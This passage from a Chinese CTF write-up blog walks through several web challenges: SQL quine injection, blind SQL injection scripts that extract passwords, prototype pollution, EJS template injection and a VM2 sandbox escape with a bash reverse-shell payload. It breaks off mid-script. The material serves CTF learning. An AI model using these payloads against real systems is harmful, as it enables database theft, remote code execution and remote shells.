<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select replace(&quot;.&quot;,char(46),&quot;.&quot;);</span><br><span class="line">这里的char(46)等于.</span><br><span class="line">将&quot;.&quot;里的.换成.并返回替换的结果.</span><br><span class="line"></span><br><span class="line">select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">结果为:</span><br><span class="line">replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:center">replace(‘replace(&quot;.&quot;,char(46),&quot;.&quot;)’,char(46),‘replace(&quot;.&quot;,char(46),&quot;.&quot;)’)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">replace(“replace(”.&quot;,char(46),&quot;.&quot;)&quot;,char(46),“replace(”.&quot;,char(46),&quot;.&quot;)&quot;)</td>
</tr>
</tbody>
</table>
<p>原因：第三个参数把第一个参数的。换成 replace (&quot;.&quot;,char (46),&quot;.&quot;)<br>
 但是此时变成了双引号，我们换成单引号才能保证输入输出一样，char (34) 为 &quot; char (46) 为’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select replace(replace(&#x27;&quot;.&quot;&#x27;,char(34),char(39)),char(46),&quot;.&quot;);</span><br><span class="line">将&quot;.&quot;的&quot;换成&#x27;,然后将.换成.</span><br><span class="line">结果是:&#x27;.&#x27;</span><br><span class="line">那么就可以这样构造:</span><br></pre></td></tr></table></figure>
<p>最终:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br></pre></td></tr></table></figure>
<p>过程：看最外面的 replace 函数<br>
 replace (‘replace (replace (&quot;.&quot;,char (34),char (39)),char (46),&quot;.&quot;)’,char (34),char (39)) 里面的 char (46) 也就是。换成 replace (replace (&quot;.&quot;,char (34),char (39)),char (46),&quot;.&quot;) 就是:</p>
<p>replace(‘replace(replace(“replace(replace(”.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;,char(34),char(39)),char(46),“replace(replace(”.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;)’,char(34),char(39))</p>
<p>然后就是把 replace (replace (“replace (replace (”.&quot;,char (34),char (39)),char (46),&quot;.&quot;)&quot;,char (34),char (39)),char (46),“replace (replace (”.&quot;,char (34),char (39)),char (46),&quot;.&quot;)&quot;) 里面的 char (34) 也就是双引号换成 char (39) 单引号，就是:</p>
<p>replace(replace(‘replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)’,char(34),char(39)),char(46),‘replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)’)<br>
 就变回了原样</p>
<h5 id="quine基本形式"><a class="markdownIt-Anchor" href="#quine基本形式">#</a> Quine 基本形式</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/replace(replace(&#x27;str&#x27;,char(34),char(39)),char(46),&#x27;str&#x27;)#</span><br></pre></td></tr></table></figure>
<p>那么 str 基本形式:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union/**/select/**/replace(replace(&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
<h3 id="26hznuctf-2023-preliminaryezlogin"><a class="markdownIt-Anchor" href="#26hznuctf-2023-preliminaryezlogin">#</a> 26.[HZNUCTF 2023 preliminary]ezlogin</h3>
<p>查看源代码发现这个注释:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$username = strrev(base64_decode($_POST[&#x27;username&#x27;]));</span></span><br><span class="line"><span class="comment">$username = preg_replace(&#x27;/select|union|and|database/&#x27;, &quot;hznuctf2023&quot;, $username);--&gt;</span></span><br></pre></td></tr></table></figure>
<p>写段 php 来测试页面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;1&#x27;||if(1,sleep(5),1)#&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">/*1||if(1,sleep(5),1)#</span></span><br><span class="line"><span class="comment">判断出单引号闭合</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤了 +, 空格，=,<br>
 注释用 #,= 用 like, 空格用 <code>/**/</code>  时间盲注脚本改下参数即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> datetime  </span><br><span class="line">  </span><br><span class="line">url=<span class="string">&#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span>  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):  <span class="comment">#这里其实是33到100,注意i是截取的范围</span></span><br><span class="line">low = <span class="number">32</span>  </span><br><span class="line">high = <span class="number">130</span>  </span><br><span class="line">mid = (high + low) // <span class="number">2</span>  </span><br><span class="line"><span class="keyword">while</span> (low &lt; high):  </span><br><span class="line"><span class="comment">#payload = &quot;1&#x27;||if((ascii(substr((DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class="line"><span class="comment">#payload = &quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class="line"><span class="comment">#payload = &quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/DATABASE()/**/AND/**/table_name/**/like/**/&#x27;user&#x27;),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class="line">payload = <span class="string">&quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(&#x27;username&#x27;,&#x27;^&#x27;,password)/**/from/**/users.user),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;</span>  </span><br><span class="line">  </span><br><span class="line">payload = payload.<span class="built_in">format</span>(i, mid)  </span><br><span class="line"><span class="built_in">print</span>(payload)  </span><br><span class="line">payload = base64.b64encode(payload[::-<span class="number">1</span>].encode(<span class="string">&quot;utf-8&quot;</span>))  </span><br><span class="line">data = &#123;  </span><br><span class="line"><span class="string">&#x27;username&#x27;</span>:payload,  </span><br><span class="line"><span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;1&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">time1 = datetime.datetime.now()  </span><br><span class="line">r = requests.post(url, data)  </span><br><span class="line">time2 = datetime.datetime.now()  </span><br><span class="line">time = (time2 - time1).seconds  </span><br><span class="line"><span class="keyword">if</span> time &gt; <span class="number">1</span>:  </span><br><span class="line">low = mid + <span class="number">1</span>  </span><br><span class="line"><span class="keyword">else</span>:  </span><br><span class="line">high = mid  </span><br><span class="line">mid = (low + high) // <span class="number">2</span>  </span><br><span class="line"><span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">130</span>):  </span><br><span class="line"><span class="keyword">break</span>  </span><br><span class="line">flag += <span class="built_in">chr</span>(mid)  </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>假如我们知道成功时会返回 success, 那么此题还可以用布尔盲注 (时间更快，优先考虑)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="comment">#请求网络界面就要调用  </span></span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sql</span>(<span class="params">url</span>):  </span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#pay=&quot;1&#x27;/**/or/**/ascii(substr((SELECT/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;#&quot;  </span></span><br><span class="line">pay=<span class="string">&quot;1&#x27;/**/or/**/ascii(substr((SELECT/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span><span class="comment">#根据实际情况更改  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">100</span>):<span class="comment">#这里的i就是可显示字符的范围  </span></span><br><span class="line">left = <span class="number">32</span>  </span><br><span class="line">right = <span class="number">126</span>  </span><br><span class="line">mid = (left + right) // <span class="number">2</span>  </span><br><span class="line"><span class="keyword">while</span> (left&lt;right):  </span><br><span class="line">payload = pay.<span class="built_in">format</span>(i, mid) <span class="comment"># 这两个参数分别放到中括号  </span></span><br><span class="line">data = &#123;  </span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: base64.b64encode(payload[::-<span class="number">1</span>].encode()),  </span><br><span class="line"><span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">r = requests.post(url, data=data)  </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:<span class="comment">#这里的success就是正确返回的内容  </span></span><br><span class="line">left=mid+<span class="number">1</span>  </span><br><span class="line"><span class="keyword">else</span>:  </span><br><span class="line">right=mid  </span><br><span class="line">mid=(left+right)//<span class="number">2</span>  </span><br><span class="line">flag+=<span class="built_in">chr</span>(mid)  </span><br><span class="line"><span class="built_in">print</span>(flag)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">sql(<span class="string">&#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="27hgame-2023-week1guess-who-i-am"><a class="markdownIt-Anchor" href="#27hgame-2023-week1guess-who-i-am">#</a> 27.[HGAME 2023 week1]Guess Who I Am</h3>
<p>此题源代码有提示一个:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BvdGF0MDAwMC9WaWRhci1XZWJzaXRlL2Jsb2IvbWFzdGVyL3NyYy9zY3JpcHRzL2NvbmZpZy9tZW1iZXIuanM="> 网址</span><br>
不难看出此题要求根据内容找到成员名字提交正确 100 次即可，但是那些特征却不在源代码中。因为那是 js 动态生成的<br>
思路：爬取标签内容 -&gt; 找到 json 数据中对应的成员 -&gt; 提交给网页<br>
<a href="">爬取 js 动态数据可以看这篇</a><br>
 exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> json  </span><br><span class="line">  </span><br><span class="line">host = <span class="string">&quot;http://node2.anna.nssctf.cn:28018/&quot;</span>  </span><br><span class="line">getQ = host + <span class="string">&quot;api/getQuestion&quot;</span>  </span><br><span class="line">getS = host + <span class="string">&quot;api/getScore&quot;</span>  </span><br><span class="line">postA = host + <span class="string">&quot;api/verifyAnswer&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 打开文本,这里是从HINT给的那个网站上复制下来的，然后做了手工处理方便后续代码执行，  </span></span><br><span class="line"><span class="comment">#一是把最外层的方括号和那串字符去掉了，二是把最后一个花括号去掉了，三是把avatar的值有require的把他处理成双引号包含的字符，因为字典没有长这样的  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\30779\Desktop\1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">data = f.read() <span class="comment"># 读取文本  </span></span><br><span class="line">members = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, data.split(<span class="string">&#x27;&#125;,&#x27;</span>)))  </span><br><span class="line">  </span><br><span class="line">session = requests.session() <span class="comment"># 保持会话，避免每次请求Cookie不同  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):  </span><br><span class="line">Q = json.loads(session.get(getQ).text)[<span class="string">&#x27;message&#x27;</span>] <span class="comment"># 将获取到的json数据转换成字典  </span></span><br><span class="line">S = json.loads(session.get(getS).text)[<span class="string">&#x27;message&#x27;</span>]  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;您要回答的问题 &#x27;</span>+Q)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;您现在的分数为 &#x27;</span>+<span class="built_in">str</span>(S))  </span><br><span class="line"><span class="keyword">for</span> member <span class="keyword">in</span> members:  </span><br><span class="line">member += <span class="string">&#x27;&#125;&#x27;</span>  </span><br><span class="line">dic = json.loads(member)  </span><br><span class="line"><span class="keyword">if</span> dic[<span class="string">&#x27;intro&#x27;</span>] == Q:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;恭喜你找到了 &#x27;</span>+dic[<span class="string">&#x27;id&#x27;</span>])  </span><br><span class="line">session.post(postA, data=&#123;<span class="string">&#x27;id&#x27;</span>: dic[<span class="string">&#x27;id&#x27;</span>]&#125;)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="28hgame-2023-week4shared-diary"><a class="markdownIt-Anchor" href="#28hgame-2023-week4shared-diary">#</a> 28.[HGAME 2023 week4]Shared Diary</h3>
<p>考点：原型链污染和 ejs 模板 ssti<br>
<a href=""> 原型链污染可以看这篇</a><br>
 burp 抓包，改 Content-Type 为 application/json 用来发 json 数据<br>
附件的源代码有 merge 函数导致原型链，过滤了 <code>__proto__</code> 要用 constructor.prototype 来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>或者:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;password&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这段 payload 先定义 constructor 的构造方法，利用原型对象 prototype 定义一个属性 role 值为 admin,<br>
 然后 response 会显示一个<mark> Set-Cookie</mark> 的 session 值，告诉你这是 302 重定向用的，路径是 /<br>
 因此我们就可以利用这个 session 登录 (username 和 password 都是 admin), 注意<mark>此时要修改路径为 /, 否则登不进去</mark></p>
<p>进入后是一个 ejs 模板注入<br>
 <code>&#123;%-code%&#125;</code>  标签可以执行 js 代码，此题无过滤<br>
步骤跟之前一样，改 session,<mark> 换路径为 /</mark></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure>
<p>payload2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- process.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;).toString() %&gt;</span><br></pre></td></tr></table></figure>
<p>tplmap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tplmap.py -u http://node2.anna.nssctf.cn:28131/ -d diary=1 -c session=s%3AevnNci_FQ3mbuQ53FJAkHIG1q_3Cmzf7.7MN5h%2F6huxvKTZFAUDFvPi%2FS0s8i53HTpqqutPLTp1U -e ejs --os-shell</span><br></pre></td></tr></table></figure>
<h3 id="29hznuctf-2023-finaleznode"><a class="markdownIt-Anchor" href="#29hznuctf-2023-finaleznode">#</a> 29.[HZNUCTF 2023 final]eznode</h3>
<p>此题要学习 VM2 和 VM2 沙箱逃逸，可以看看这篇<a href=""> VM 沙箱逃逸</a><br>
 app.js 看源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有 merge 原型链污染，vm2 沙箱逃逸，backdoor 方法 <code>new VM().run(&#123;&#125;.shellcode);</code>  可以利用原型链污染到 shellcode，进而 rce</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./foo.js&#x27;</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)(<span class="params"></span>).<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;shit&quot;:1,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(\&quot;return this\&quot;) ().process.mainModule.require(\&quot;child_process\&quot;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;).toString();&quot;&#125;&#125; </span><br></pre></td></tr></table></figure>
<p>注意这里反弹 shell 要有公网 ip, 先在自己的 vps 上 nc -lvp port<br>
![[Pasted image 20230511202706.png]]</p>
<h3 id="30第五空间-2021easycleanup"><a class="markdownIt-Anchor" href="#30第五空间-2021easycleanup">#</a> 30.[第五空间 2021] EasyCleanup</h3>
<p>本题考点：利用 session.upload_progress 进行文件包含，<a href=""> 详解看这里</a><br>
 fuzz:<br>
mode=eval&amp;shell=system (‘ls /’); 看根目录的所有文件名，发现 nssctfasdasdflag, 但是 shell 的长度不能超过 15 或者传 file 包含但是长度也不能超过 15, 而 nssctfasdasdflag 的长度是 16</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> threading  </span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span>  </span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat /nssctfasdasdflag&#x27;);&quot;</span>&#125; <span class="comment">#此处可以执行任何系统命令 </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">f = 